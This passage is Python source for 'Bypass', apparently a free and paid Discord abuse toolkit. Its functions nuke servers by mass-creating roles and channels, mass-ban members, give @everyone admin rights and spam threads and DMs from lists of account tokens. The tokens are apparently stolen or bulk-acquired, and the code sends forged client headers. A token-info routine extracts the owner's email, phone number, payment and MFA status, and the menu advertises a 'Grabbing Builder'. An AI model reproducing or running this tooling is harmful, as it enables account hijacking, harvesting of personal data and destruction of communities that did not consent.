$massban [Free Version - Slow]
```
**Member ids must be in data/member_ids.txt**'''
            embed = discord.Embed(title="Bypass Nuker Commands [BETA]", description=desc)
            await message.channel.send(embed=embed)

        if message.content.startswith('$role'):
                await message.delete()
                role_names = message.content[5:].split()
                guild = message.guild
                for role_name in role_names:
                    for i in range(1000):
                        await guild.create_role(name=role_name)

        if message.content.startswith('$massban'):
            with open('data/member_ids.txt') as f:
                guild = client.get_guild(GUILDID)
                member_ids = f.readlines()
                member_ids = [id.strip() for id in member_ids]

                if message.channel.id == CHANNELID:
                    async def ban_members(member_ids, guild):
                        for id in member_ids:
                            try:
                                member = await guild.fetch_member(id)
                                await member.ban(reason='Banned by bot')
                                print(f'Banned user {member.name} ({member.id})')
                            except discord.errors.NotFound:
                                print(f'Could not find user with ID {id}')

                    batches = [member_ids[i:i+5] for i in range(0, len(member_ids), 5)]
                    threads = []
                    for batch in batches:
                        thread = threading.Thread(target=await ban_members(batch, guild))
                        threads.append(thread)
                        thread.start()

                    for thread in threads:
                        thread.join()

    client.run(TOKEN)

def create_thread(token, title, channelid):
    payload = {
        'name': f'{title}',
        'type': 11,
        'auto_archive_duration': 60,
        'channel_id': f'{channelid}'
    }
    headers = {'Authorization': f'{token}',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
               'Origin': 'discord.com',
               'Accept': '*/*',
               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
               'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
    response = requests.post(f'https://discord.com/api/v9/channels/{channelid}/threads', headers=headers, json=payload)
    if response.status_code == 201 or response.status_code == 204:
        print(f'{w}[{b}CREATED{w}] Created Thread {title} on {token}')
    else:
        print(f'{w}[{rr}ERROR{w}] Could not create Thread on {token}')
def threadspamme1r():
    b = Fore.BLUE
    title = Write.Input('[>] Thread Title: ', culur, interval=0.000)
    channelid = Write.Input('[>] Channel ID: ', culur, interval=0.000)
    with open('data/tokens.txt', 'r') as f:
        tokens = f.read().splitlines()
    num_threads = int(Write.Input('[>] Amout of Threads: ', culur, interval=0.000))
    with concurrent.futures.ThreadPoolExecutor(max_workers=10000) as executor:
        for i in range(num_threads):
            for token in tokens:
                executor.submit(create_thread, token, f'{title} #{i+1}', channelid)

def selfbotnuker():
    clear()
    b = Fore.BLUE
    print(f'{w}[{b}PROXIES{w}] This Option requires Proxies in format ip:port fomat! - Slow Proxie = Slow Nuker')
    prox = open('data/proxies.txt', 'r').readline()
    proxies = {
    "http": prox,
    "https": prox
    }
    x = """
> ```$mc - mass creates channels```

> ```$mr - mass creates roles```

> ```$mp - give @everyone perms```

> ```more stuff in Bypass - Paid Version```"""
    TOKEN = input(f'{w}[{b}TOKEN{w}] TKN » ')
    CHANNEL_ID = input(f'{w}[{b}CHANNEL{w}] ID » ')
    GUILD_ID = input(f'{w}[{b}GUILD{w}] ID » ')
    MESSAGES_URL = "https://discordapp.com/api/v8/channels/{channel_id}/messages"
    HEADERS = {'Authorization': f'{TOKEN}',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
               'Origin': 'discord.com',
               'Accept': '*/*',
               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
               'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}

    clear()
    print(f'{w}[{b}COMMANDS{w}] » Type **$cmds** for all commands')
    def mp():
        response = requests.get(f'https://discord.com/api/v9/guilds/{GUILD_ID}/roles',
                                headers=HEADERS)
        roles = response.json()
        everyone_role_id = None
        for role in roles:
            if role['name'] == '@everyone':
                everyone_role_id = role['id']
                break
        payload = {
            'permissions': '8'
        }
        response = requests.patch(f'https://discord.com/api/v9/guilds/{GUILD_ID}/roles/{everyone_role_id}',
                                  headers=HEADERS,
                                  json=payload)
        
        if response.status_code == 200 or 204 or 201:
            print(f'{w}[{b}DONE{w}] Gave @everyone admin perms!')
        else:
            print(f"{w}[{rr}ERROR{w}] Couldnt give @everyone admin perms! status code » {response.status_code}")
    def mr():
        data = {
            "name": "Bypass",
            "permissions": 0,
            "color": 0xFF0000,
            "hoist": False,
            "mentionable": True
        }

        i = 0
        url = f"https://discord.com/api/v9/guilds/{GUILD_ID}/roles"
        response = requests.post(url, headers=HEADERS, data=json.dumps(data))
        if response.status_code == 201 or 204:
            print(f'{w}[{b}CREATED{w}] Created Role #{i+1}')
        else:
            pass

    def mc():
        def send_messages(channel_id):
            message_payload = {
                "content": "@everyone Bypass runs cord - https://bypasstool.xyz"
            }
            for i in range(1):
                message_response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=HEADERS, json=message_payload)
                message_response.raise_for_status()
                print(f"Thread {threading.current_thread().name} sent message {i+1}")

        def create_channel_and_send_messages():
            payload = {
                "name": 'BYPASS',
                "type": 0
            }

            response = requests.post(f"https://discord.com/api/v9/guilds/{GUILD_ID}/channels", headers=HEADERS, json=payload)
            response.raise_for_status()
            channel_id = response.json()['id']
            threads = []
            for i in range(10):
                thread = threading.Thread(target=send_messages, args=(channel_id,), name=f"Thread-{i+1}")
                threads.append(thread)
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()

        create_channel_and_send_messages()

    online = requests.get('https://discord.com/channels/@me')
    while True:
        response = requests.get(MESSAGES_URL.format(channel_id=CHANNEL_ID), headers=HEADERS)
        data = json.loads(response.text)
        if data[0]["content"] == "$mc":
            mc()
        if data[0]["content"] == "$cmds":
            requests.post(MESSAGES_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"{x}"
            })
        if data[0]["content"] == "$mr":
            mr()

        if data[0]["content"] == "$mp":
            mp()

def unreact():
    with open('data/tokens.txt') as f:
        tokens = f.read().splitlines()
    channel_id =  Write.Input(f'[>] Channel ID: ', culur, interval=0.0000)
    message_id = Write.Input(f'[>] Message ID: ', culur, interval=0.000)
    emoji = Write.Input(f'[>] Emoji: ', culur, interval=0.000)
    def unreact_message(token):
        headers = {'Authorization': f'{token}',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                   'Origin': 'discord.com',
                   'Accept': '*/*',
                   'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                   'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
       
        endpoint_url = f"https://discord.com/api/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me"

        response = requests.delete(endpoint_url, headers=headers)
        if response.status_code == 204:
            print(f"{Fore.LIGHTBLUE_EX}[REMOVED] {Fore.WHITE}Reaction from {Fore.LIGHTBLUE_EX}{token}")
        else:
            print(f"{Fore.LIGHTRED_EX}[ERROR] {Fore.WHITE}Error from {Fore.LIGHTRED_EX}{token}")

    threads = []
    for token in tokens:
        t = threading.Thread(target=unreact_message, args=(token,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    main()

def pressbutto():
    channel_id = Write.Input('[>] Channel ID: ', culur, interval=0.000)
    message_id = Write.Input('[>] Message ID: ', culur, interval=0.000)
    button_id = Write.Input('[>] Button ID: ', culur, interval=0.000)
    with open('data/tokens.txt', 'r') as f:
        tokens = f.read().splitlines()
    for token in tokens:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}"
        headers = {'Authorization': f'{token}',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                   'Origin': 'discord.com',
                   'Accept': '*/*',
                   'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                   'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}

        response = requests.get(url, headers=headers)
        message_data = json.loads(response.content)

        button_index = None
        for i, component in enumerate(message_data["components"][0]["components"]):
            if component["custom_id"] == button_id:
                button_index = i
                break

        if button_index is None:
            print(f"[!] Button with ID '{button_id}' not found on the message.")
            continue

        payload = {
            "type": 2,
            "component_type": 2,
            "custom_id": button_id,
            "message": message_data
        }

        response = requests.post(url, headers=headers, json=payload)

def dmid():
    def send_dm(token, user_id, msgmsg):
        url = "https://discord.com/api/users/@me/channels"
        headers = {'Authorization': f'{token}',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                   'Origin': 'discord.com',
                   'Accept': '*/*',
                   'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                   'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
        data = {
            "recipient_id": user_id
        }
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            channel_id = response.json()["id"]
            url = f"https://discord.com/api/channels/{channel_id}/messages"
            data = {
                "content": msgmsg
            }
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(f"{Fore.LIGHTBLUE_EX}[SUCCESS]{Fore.WHITE}: Sent Message on {Fore.LIGHTBLUE_EX}{token}")
            else:
                print(f"{Fore.LIGHTRED_EX}[ERROR]{Fore.WHITE}: Couldn't DM on {Fore.LIGHTRED_EX}{token}")
        else:
            pass

    with open("data/tokens.txt", "r") as f:
        tokens = f.read().splitlines()

    user_id = Write.Input("[>] UserID: ", culur, interval=0.000)
    msgmsg = Write.Input("[>] Message to Send: ", culur, interval=0.000)
    threads = []
    for token in tokens:
        thread = threading.Thread(target=send_dm, args=(token, user_id, msgmsg))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

def checknitrotok():
    with open('data/tokens.txt') as f:
        tokens = f.read().splitlines()

    for token in tokens:
        headers = {
            'Authorization': token
        }

        r = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers)

        if r.status_code == 200:
            for sub in r.json():
                if sub['plan_id'] in ['nitro', 'nitro_basic', 'nitro_boost']:
                    print(f'{Fore.LIGHTBLUE_EX}[NITRO]{Fore.WHITE}: Token has Nitro {Fore.LIGHTBLUE_EX}{token}')
                    break
            else:
                print(f'{Fore.LIGHTRED_EX}[NORMAL]{Fore.WHITE}: Token Has no Nitro {Fore.LIGHTRED_EX}{token}')
        else:
            print(f'{Fore.LIGHTRED_EX}[NORMAL]{Fore.WHITE}: Token Has no Nitro {Fore.LIGHTRED_EX}{token}')


def tokeninfo():
    TOKEN = Write.Input('[>] Token: ', culur, interval=0.0000)
    HEADERS = {'Authorization': f'{TOKEN}',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
               'Origin': 'discord.com',
               'Accept': '*/*',
               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
               'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
    
    status = requests.get('https://discordapp.com/api/v9/users/@me', headers=HEADERS)
    response_guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=HEADERS)
    if status.status_code == 200:
        status_json = status.json()
        user_name = f'{status_json["username"]}#{status_json["discriminator"]}'
        user_id = status_json['id']
        avatar_id = status_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = status_json['phone']
        email = status_json['email']
        mfa_enabled = status_json['mfa_enabled']
        flags = status_json['flags']
        guilds = len(response_guilds.json())
        friend_req = requests.get(f"https://discord.com/api/v9/users/{user_id}/relationships", headers=HEADERS)
        relationships = friend_req.json()
        num_friends = len(relationships)
        channel_req = requests.get("https://discord.com/api/v9/users/@me/channels", headers=HEADERS)
        channels = channel_req.json()
        num_dms = len(channels)
        payment_req = requests.get("https://discord.com/api/v9/users/@me/billing/payments", headers=HEADERS)
        payments = payment_req.json()
        if len(payments) > 0:
            payment_status = True
        else:
            payment_status = False

        os.system('cls')
        Write.Print(f'[>] TOKEN INFORMATION', culur, interval=0.000)
        Write.Print(f'\n   > Username: {user_name}', culur, interval=0.000)
        Write.Print(f'\n   > UserID: {user_id}', culur, interval=0.000)
        Write.Print(f'\n   > Avatar URL: {avatar_url}', culur, interval=0.000)
        Write.Print(f'\n   > Token: {TOKEN}', culur, interval=0.000)
        Write.Print(f'\n\n[>] DATA INFORMATION', culur, interval=0.000)
        Write.Print(f'\n   > Email: {email if email else "No Email"}', culur, interval=0.000)
        Write.Print(f'\n   > Phone Number: {phone_number if phone_number else ""}', culur, interval=0.000)
        Write.Print(f'\n\n[>] OTHER INFORMATION', culur, interval=0.000)
        Write.Print(f'\n   > Server: {guilds}', culur, interval=0.000)
        Write.Print(f'\n   > Flags: {flags}', culur, interval=0.000)
        Write.Print(f'\n   > Friends: {num_friends}', culur, interval=0.000)
        Write.Print(f'\n   > DMs: {num_dms}', culur, interval=0.000)
        Write.Print(f'\n\n[>] PAYMENT INFORMATION', culur, interval=0.000)
        if payment_status is not None:
            if payment_status:
                Write.Print(f'\n   > Payments: True', culur, interval=0.000)
            else:
                Write.Print(f'\n   > Payments: False', culur, interval=0.000)
        Write.Print(f'\n   > MFA/2FA Activated: {mfa_enabled}', culur, interval=0.000)
    else:
        os.system('cls')
        Write.Print(f'[>] Invalid Discord Token. Make Sure its working!', culur, interval=0.000)
    input("\n\n\n")
    main()

def servchecker():
    server_id = Write.Input('[>] Server ID: ', culur, interval=0.000)

    def check_token(token):
        headers = {'Authorization': f'{token}',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                   'Origin': 'discord.com',
                   'Accept': '*/*',
                   'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                   'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
        response = requests.get(f'https://discord.com/api/guilds/{server_id}/members/@me', headers=headers)
        if response.status_code == 200:
            print(f'{Fore.LIGHTBLUE_EX}[MEMBER] {token}{Fore.WHITE} is a Member')
        if response.status_code == 204:
            print(f'{Fore.LIGHTBLUE_EX}[MEMBER] {token}{Fore.WHITE} is a Member')
        else:
            print(f'{Fore.LIGHTRED_EX}[NO MEMBER] {token}{Fore.WHITE} is not a Member')

    with open('data/tokens.txt', 'r') as f:
        tokens = f.read().splitlines()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for token in tokens:
            futures.append(executor.submit(check_token, token))

        for future in futures:
            future.result()
    
    input("")
    main()

try:
    if "https://bypasstool.xyz" in __website__:
        pass
    else:
        input("skid leave the credits")
        exit()
    if "BypassTool#5552" in __developers__:
        pass
    else:
        input("skid leave the credits")
        exit()
except:
    pass

def main():
    tokens = open("data/tokens.txt", 'r').read().splitlines()
    proxies = open("data/proxies.txt", 'r').read().splitlines()
    os.system(f"title {bypass_name} • {bypass_version}")
    clear()
    print("")
    dsn = '''
 ▄▄▄▄ ▓██   ██▓ ██▓███   ▄▄▄        ██████   ██████ 
▓█████▄▒██  ██▒▓██░  ██▒▒████▄    ▒██    ▒ ▒██    ▒ 
▒██▒ ▄██▒██ ██░▓██░ ██▓▒▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   
▒██░█▀  ░ ▐██▓░▒██▄█▓▒ ▒░██▄▄▄▄██   ▒   ██▒  ▒   ██▒
░▓█  ▀█▓░ ██▒▓░▒██▒ ░  ░ ▓█   ▓██▒▒██████▒▒▒██████▒▒
░▒▓███▀▒ ██▒▒▒ ▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
▒░▒   ░▓██ ░▒░ ░▒ ░       ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
 ░    ░▒ ▒ ░░  ░░         ░   ▒   ░  ░  ░  ░  ░  ░  
 ░     ░ ░                    ░  ░      ░        ░  
      ░░ ░ '''
    print(Colorate.Horizontal(culur, Center.XCenter(dsn)))
    bypass_functions = f'''════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
[01] Bypass » Server Joiner      [09] Token VC Spammer         [17] Patch Notes          [25] Token Name Changer
[02] Server Leaver               [10] Group Spammer            [18] About Bypass         [26] Discord Token Selfbot
[03] Channel Spammer             [11] Webhook Options          [19] Theme Changer        [27] Bot Server Nuker
[04] Discord Bot MassDM          [12] Token Avatar Changer     [20] Hypesquad Joiner     [28] Server MassDM
[05] Email:pass:token to Token   [13] Token Activity Changer   [21] Grabbing Builder     [29] Thread Creator 
[06] Token Year Checker          [14] Member ID Scraper        [22] Token Checker        [30] Token Selfbot Nuker
[07] Discord Bot VC Joiner       [15] Token Onliner            [23] Proxie Fetcher       [31] Mass Reaction Unadder    
[08] Server Nickname Changer     [16] Remote Control Bot       [24] Reaction Spammer     [>>] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════'''
    b = Fore.LIGHTBLUE_EX
    print(Colorate.Horizontal(culur, Center.XCenter(bypass_functions)))
    answer = input(Colorate.Horizontal(culur, f"[>] Choice ~/> "))

    if answer == "1":
        joiner()
        
    if answer == "2":
        leaver()

    if answer == "3":
        raider()
    
    if answer == "4":
        botmassdm()
    
    if answer == "5":
        tokensorter()

    if answer == "6":
        tokenyear()
    
    if answer == "7":
        botvcjoiner()
    
    if answer == "8":
        nickchanger()
    
    if answer == "9":
        vcjoiner()

    if answer == "10":
        gcspam()

    if answer == "11":
        webhookoptions()

    if answer == "12":
        ch()

    if answer == "13":
        activity()

    if answer == "14":
        idscraper()

    if answer == "15":
        onliner()

    if answer == "16":
        remotebot()

    if answer == "17":
        patchnotes()

    if answer == "18":
        about()

    if answer == "19":
        themechanger()

    if answer == "20":
        hypejoiner()

    if answer == "21":
        grabbingbuilder()

    if answer == "22":
        tokenchecker()

    if answer == "23":
        proxyfetcher()

    if answer == "24":
        reactionspammer()

    if answer == "25":
        clear()
        input(f'{w}[{b}PROXIES{w}] » This Option Needs proxies, Press ENTER to continue')
        changename()

    if answer == "26":
        selfbot()

    if answer == "27":
        servnuke()

    if answer == "28":
        massdm()

    if answer == "29":
        threadspamme1r()

    if answer == "30":
        selfbotnuker()

    if answer == "31":
        unreact()

    if answer == ">>":
        os.system('cls')
        print("")
        print(Colorate.Horizontal(culur, Center.XCenter(dsn)))
        bypass_functions = f'''════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
[<<] Recent Bypass Page           [39] Fake Typing
[32] Token Button Presser
[33] Discord DM Message Spammer 
[34] NitroToken Checker
[35] Discord Token Info
[36] Token Server Checker
[37] Advanced Server Raider
[38] Anti TokenGrabber
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════'''
        print(Colorate.Horizontal(culur, Center.XCenter(bypass_functions)))
        xanswer = input(Colorate.Horizontal(culur, f"[>] Choice ~/> "))

        if xanswer == "32":
            pressbutto()

        if xanswer == "33":
            dmid()

        if xanswer == "34":
            checknitrotok()

        if xanswer == "35":
            tokeninfo()

        if xanswer == "36":
            servchecker()

        if xanswer == "37":
            advraid()
        
        if xanswer == "38":
            webbrowser.open('https://github.com/TheKindDeveloper/Anti-Tokengrabber')
            main()
        
        if xanswer == "39":
            faketyping()
                
        else:
            pass


    if answer == "<<":
        main()
        
    else:
        main()


if __name__ == "__main__":
    main()